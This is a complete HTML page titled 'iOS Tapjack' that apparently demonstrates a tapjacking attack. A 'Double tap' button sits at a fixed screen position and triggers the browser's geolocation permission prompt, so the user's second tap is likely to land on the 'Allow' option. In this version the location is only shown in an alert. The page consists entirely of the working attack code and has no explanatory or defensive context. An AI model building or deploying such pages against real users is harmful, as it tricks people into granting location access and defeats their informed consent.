<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iOS Tapjack</title>
    <style>
        .red-button {
            position: relative;
            top: 56vh;
            left: 47vw;
            background-color: rgb(79, 235, 89);
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
    </style>
    <script>
        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude } = position.coords;
                        alert(`Location access granted. Latitude: ${latitude}, Longitude: ${longitude}`);
                    },
                    (error) => {
                        alert('Error accessing location: ' + error.message);
                    }
                );
            } else {
                alert('Geolocation is not supported by this browser.');
            }
        }
    </script>
</head>
<body>
    <button class="red-button" onclick="requestLocation()">Double tap</button>
</body>
</html>
